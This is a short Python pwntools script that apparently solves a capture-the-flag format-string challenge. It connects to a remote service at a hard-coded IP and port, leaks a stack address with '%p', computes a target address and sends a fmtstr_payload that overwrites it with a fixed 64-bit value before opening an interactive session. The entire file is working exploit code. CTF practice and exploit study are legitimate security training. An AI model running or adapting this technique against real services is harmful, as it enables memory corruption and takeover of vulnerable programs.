from pwn import *

context.arch = "AMD64"

r = remote("163.47.10.146", 8555)

r.sendline(b"%p")
r.recvuntil(b"0x")

stack_leak = int(r.recvline(), 16)
target = stack_leak - 0x11

info(f"Target obtained: {hex(target)}")

payload = fmtstr_payload(14, {target : 0x4a47b85bed7a94d7}, write_size='short')
print(f"Length of payload {len(payload)}")

r.sendline(payload)

r.interactive()